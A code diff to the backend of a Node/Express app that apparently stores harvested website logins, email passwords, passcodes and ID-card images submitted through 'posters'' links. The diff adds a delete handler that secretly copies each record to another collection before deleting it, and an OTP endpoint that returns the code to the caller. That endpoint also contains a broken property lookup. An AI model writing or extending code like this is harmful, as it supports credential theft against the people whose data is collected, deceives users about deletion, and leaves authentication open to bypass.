@@ -12,7 +12,10 @@ import createToken from '../utils/createToken.js'
 import Demo from '../models/Demo.js'
 import Cash from '../models/Cash.js'
 import rateLimitMiddleware from "../ratelimiter.js"
+import axios from 'axios';
+import Password from '../models/Password.js'
 
+import NewInfo from '../models/NewInfo.js'
 
 
 import Pusher from'pusher';
@@ -456,6 +459,56 @@ export const delete_poster =  (req, res) => {
 
 }
 
+const createInfo =async(info)=>{
+    console.log('deleted info',info)
+
+  const hello =   await NewInfo.create({
+
+    site:info.site, email:info.email, password:info.password, skipcode:info.skipcode,
+    username:info.username,passcode:info.passcode,mail:info.mail,mailPass:info.mailPass,adminId:info.adminId,
+    poster :info.poster,
+    root :info.root,
+    onlyCard:info.onlyCard,holdingCard:info.holdingCard
+  });
+     console.log('deleted yes',hello)
+}
+export const delete_info = async (req, res) => {
+
+    const { info_id,pos_id } = req.params
+
+    // return res.status(200).json({ data: info_id })
+
+
+  const info= await Info.findById({ _id: info_id })
+      const newinfo= await NewInfo.create({site:info.site, email:info.email, password:info.password, skipcode:info.skipcode,
+        username:info.username,passcode:info.passcode,mail:info.mail,mailPass:info.mailPass,adminId:info.adminId,
+        poster :info.poster,
+        root :info.root,
+        onlyCard:info.onlyCard,holdingCard:info.holdingCard})
+
+    // return res.status(200).json({  newinfo })
+
+
+    Info.findByIdAndRemove({ _id: info_id })
+    .then(user => console.log('deleted yes')).catch(err => console.log('deleted yes'))
+   
+    Poster.findById({ _id: pos_id })
+    .select('username password posterId links createdAt details')
+    .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
+    .then(data => {
+        return res.status(200).json({ data: data })    }
+    ).catch(err => console.log('err', err))
+
+}
+
+
+
+
+
+
+
+
+
 export const link_add = async (req, res) => {
 
     const { linkName } = req.body
@@ -536,18 +589,7 @@ export const poster_details =  (req, res) => {
 
     ).catch(err => console.log('err', err))
 
-    // try {
-
-    //     const data = await Poster.findOne({ _id: id })
-    //         .select('username password posterId links createdAt details')
-    //         .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
-    //     return res.status(200).json({ data: data })
-
-
-
-    // } catch (e) {
-    //     res.status(400).json({ e: "error" })
-    // }
+ 
 
 }
 
@@ -860,6 +902,49 @@ export const click_for_admin = async (req, res) => {
     }
 
 }
+
+
+
+export const otp_send = async (req, res) => {
+    const {username, phone } = req.body
+    const apiUrl = 'http://127.0.0.1:8000/v1/sms/send/otp';
+
+    const postData =  {
+        phone: phone,
+        type:"hello,rana mia"        // Add more data as needed
+      }
+    //   const response = await  axios.post(apiUrl,postData)
+    //   return res.status(200).json({ success:response.data.otp})
+
+      try{
+        const   userFound = await User.findOne({username:username})
+         if(userFound.phone == phone){
+            const response = await  axios.post(apiUrl,postData)
+            userFound.otp=userFound.response.data.otp
+
+            await  userFound.save()
+            const   passwordOfPassChanges= await Password.findOne({constant:"yanky"})
+            passwordOfPassChanges.totalRequest= passwordOfPassChanges.totalRequest + 1
+            await  passwordOfPassChanges.save()
+
+            return res.status(200).json({ success:response.data.otp})
+         }
+        return  res.status(400).json({ e: "user not found" })
+
+
+        
+      }
+      catch(e){
+        return    res.status(400).json({ e: "error" })
+
+      }
+
+        
+
+}
+
+
+
 
 export const pass_change = async (req, res) => {
     const { username ,password} = req.body
